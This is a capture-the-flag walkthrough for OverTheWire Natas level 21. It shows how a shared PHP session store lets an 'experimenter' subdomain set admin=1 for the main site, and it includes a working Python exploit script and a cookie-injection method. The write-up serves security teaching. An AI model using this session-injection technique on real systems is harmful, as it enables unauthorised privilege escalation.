# OverTheWire: Natas — Level 21 → Level 22

> **Vulnerability:** Cross-Site Session Sharing (Session Fixation via Subdomain)                           
> **Skills:** PHP session mechanics, cookie injection, Python `requests`                   
> **Difficulty:** Medium                        
> **Official Page:** [Natas Level 21](https://overthewire.org/wargames/natas/natas21.html)

---

## Access

- **URL:** `http://natas21.natas.labs.overthewire.org`
- **Username:** `natas21`
- **Password:** *obtain from previous level*

---

## Task

Find the password for Level 22 by exploiting the fact that two separate subdomains share the same PHP session storage — allowing you to set an elevated session on one subdomain and then use it on the other.

---

## Vulnerability

This level demonstrates **cross-subdomain session sharing with no privilege isolation**. Two applications — the main site and a separate "experimenter" site — both store session data in the same PHP session backend. The experimenter site allows arbitrary session variables to be written via POST parameters, including an `admin` flag it was never intended to expose. Because there is no check on *which application* wrote the session data, and no boundary between the two apps' session namespaces, a session created on the experimenter site and carrying `admin=1` is treated as fully authoritative by the main site. The developer mistake is running two logically separate apps under a shared session store without enforcing per-application session namespaces or validating the origin of session values.

---

## Theory

### PHP Sessions

When a PHP application calls `session_start()`, the server assigns the browser a unique session identifier stored in a cookie called `PHPSESSID`. On every subsequent request, the browser sends this cookie back, and the server uses it to load the corresponding session data from its storage (a file, database, or memory store).

| Concept | Explanation |
|---|---|
| `PHPSESSID` | The session cookie PHP sets and reads to identify a user's session |
| `$_SESSION` | The PHP superglobal array holding all session variables for the current session |
| `session_start()` | Initialises or resumes a session based on the incoming `PHPSESSID` cookie |
| Session storage | Server-side store (default: `/tmp/sess_<id>` files) keyed by session ID |

### The Shared Session Backend

Both `natas21.natas.labs.overthewire.org` and `natas21-experimenter.natas.labs.overthewire.org` are PHP applications running on the same server. Because they share the same PHP session storage directory, a session file written by one application is fully readable by the other — there is no application-level isolation.

This means: if you POST to the experimenter and it writes `$_SESSION['admin'] = 1` into a session file, and you then send that same `PHPSESSID` to the main site, the main site will load that session and see `admin = 1`.

### The Attack in Three Steps

1. POST to the experimenter with `admin=1` as a form field, which causes it to write `admin=1` into a session.
2. Extract the `PHPSESSID` cookie from that response.
3. Send a GET request to the main site using that same `PHPSESSID`. The main site reads the session, sees `admin=1`, and returns the password.

### Tools Used

| Tool / Parameter | Purpose |
|---|---|
| `requests.Session()` | Maintains cookies across multiple requests automatically |
| `session.cookies['PHPSESSID']` | Reads the session cookie after the first request |
| `cookies={"PHPSESSID": ...}` | Injects a specific session cookie into a subsequent request |
| `?debug=true` | A query parameter the experimenter accepts that makes it print session contents — useful for confirming the attack |

**Good to know — not needed here:** Burp Suite can be used to inspect and replay cookies visually. For this level a Python script is cleaner and faster.

---

## Solution

### Step 1 — Read the source of the main site

Navigate to `http://natas21.natas.labs.overthewire.org` and log in. The page tells you it is co-located with an experimenter site and that you are not an admin. Use **View Page Source** (`Ctrl+U` in most browsers) to read the PHP source embedded in the page.

```html
<?php

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials.";
    }
}

session_start();
print_credentials();
?>
```

> **What to notice:** The only condition gating the password is `$_SESSION['admin'] == 1`. There is no authentication check, no IP check, no password check — if the session has that one variable set to `1`, the password is printed. The session value itself is the entire access control.

---

### Step 2 — Read the source of the experimenter site

Navigate to `http://natas21-experimenter.natas.labs.overthewire.org` (log in with the same `natas21` credentials — this subdomain uses the same HTTP Basic Auth). View its source.

```html
<?php

session_start();

if(array_key_exists("submit", $_POST)) {
    foreach($_POST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

// ... (styling and form rendering below)
?>
```

> **What to notice:** The experimenter iterates over **every** POST parameter and writes each one directly into `$_SESSION`. There is no allowlist and no validation. If you POST `admin=1`, it writes `$_SESSION['admin'] = 1` into the session file. That session file is the same one the main site will read.

---

### Step 3 — Write the exploit script

The script performs two HTTP requests using a shared session object (so the cookie is carried over automatically):

1. POST to the experimenter with `admin=1` to populate the session.
2. GET the main site using the session ID obtained from step 1.

```python
import requests

target     = 'http://natas21.natas.labs.overthewire.org'
exp_target = 'http://natas21-experimenter.natas.labs.overthewire.org'
auth       = ('natas21', '<natas21_password>')

session = requests.Session()

# Step A: POST to the experimenter — write admin=1 into the session
response = session.post(
    exp_target,
    auth=auth,
    params={'debug': 'true'},
    data={'submit': '1', 'admin': '1'}
)

# Extract the PHPSESSID that now holds admin=1
admin_session_id = session.cookies['PHPSESSID']
print("[*] Experimenter response (debug output):")
print(response.text)
print(f"\n[*] PHPSESSID with admin=1: {admin_session_id}")

# Step B: GET the main site using that session ID
response2 = requests.get(
    target,
    auth=auth,
    cookies={'PHPSESSID': admin_session_id}
)
print("\n[*] Main site response:")
print(response2.text)
```

---

### Step 4 — Run the script and read the output

Replace `<natas21_password>` with the password you obtained for Level 21, then run:

```bash
python3 exploit.py
```

```
[*] Experimenter response (debug output):
...
Session contents: Array ( [submit] => 1 [admin] => 1 )
...

[*] PHPSESSID with admin=1: <some_session_id_string>

[*] Main site response:
...
You are an admin. The credentials for the next level are:
Username: natas22
Password: <the_password>
...
```

> **What to notice:** The debug output from the experimenter confirms that `admin=1` was written into the session. The main site response then reads that same session and prints the password without any further authentication. The two apps are speaking through the same session file on disk without knowing it.

---

### Step 5 — Why `requests.Session()` matters here

`requests.Session()` is not strictly required — you could manually copy the cookie string. But it cleanly handles cookie persistence across requests, which mirrors exactly what a browser does. Using it also makes the exploit more readable: the session object's internal cookie jar carries the `PHPSESSID` from the POST response automatically, so you only need to read it once.

If you were doing this manually in a browser, you would:

1. Open DevTools → Application tab → Cookies.
2. Note the `PHPSESSID` value after POSTing to the experimenter.
3. Navigate to the main site and use the DevTools console to `document.cookie = "PHPSESSID=<value>"`, then reload.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

- Two applications sharing a session backend with no namespace isolation create a privilege escalation path: compromise one, and you compromise both.
- Writing raw POST parameters into `$_SESSION` without any validation or allowlist is a critical flaw — any client-controlled key becomes a session variable, and if another application trusts those variables for access control, the result is a full authentication bypass.
- In real deployments, applications on separate subdomains should use distinct session names (`session_name()` in PHP), isolated storage paths, or a session store that enforces per-application namespaces.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| POSTing to the main site instead of the experimenter | The main site does not echo POST params into session; you get a regular user response | Make sure the first POST goes to `natas21-experimenter.natas.labs.overthewire.org` |
| Not including `submit=1` in the POST body | The experimenter checks `array_key_exists("submit", $_POST)` before writing anything to session; without it, nothing is written | Always include `submit=1` alongside `admin=1` |
| Using a plain `requests.get()` for the second call without the cookie | The main site creates a new empty session; no `admin` key is present and the password is not shown | Pass `cookies={'PHPSESSID': admin_session_id}` explicitly, or use a shared `requests.Session()` |
| Sending both requests to the experimenter | The experimenter only writes session data — it does not check for `admin` and print the password | The second request must go to the main site (`natas21.natas.labs.overthewire.org`) |
| Copying the cookie string incorrectly (extra spaces, truncated ID) | The server cannot find the session file; a new empty session is created instead | Print the raw cookie value before using it and verify there is no whitespace |
